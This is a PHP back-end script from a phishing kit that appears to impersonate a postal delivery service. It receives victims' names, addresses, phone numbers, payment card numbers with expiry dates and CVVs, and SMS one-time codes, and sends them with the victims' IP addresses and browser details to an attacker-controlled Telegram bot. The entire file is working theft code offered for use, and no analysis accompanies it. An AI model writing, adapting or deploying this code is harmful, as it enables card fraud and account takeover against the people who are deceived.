<?php 
require 'main.php';

$bot = $TELEGRAM_API['bot_token'];
$id =  $TELEGRAM_API['chat_id'];
$host = $_SERVER['SERVER_NAME'];
$ip =  $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d, H:i:s");

function post($data){
    global $bot;
    global $id;
    $data = urlencode($data);
    $url = "https://api.telegram.org/bot".$bot."/sendMessage?chat_id=".$id."&text=".$data;
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $url);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}


if(isset($_POST['otp'])){
$data = "
[ DPOST SMS ]
CODE : ".$_POST['otp']."

[ SYS INFO ]
Host: ".$host."
Ip: ".$ip."
Time: ".$time."
User agent: ".$ua;
post($data);

} 

if(isset($_POST['d0'])){

$data = "
[ DPOST INFO ]
Full nam:   ".$_POST['d0']."
Address:   ".$_POST['d1']."
City:   ".$_POST['d2']."
Zip:   ".$_POST['d3']."
Phone:   ".$_POST['d4']."

[ DPOST CC ]
Card number:   ".$_POST['d5']."
Exp:   ".$_POST['d6']."
Cvv:   ".$_POST['d7']."

[ SYS INFO ]
Host: ".$host."
Ip: ".$ip."
Time: ".$time."
User agent: ".$ua
;

post($data);


} 

?>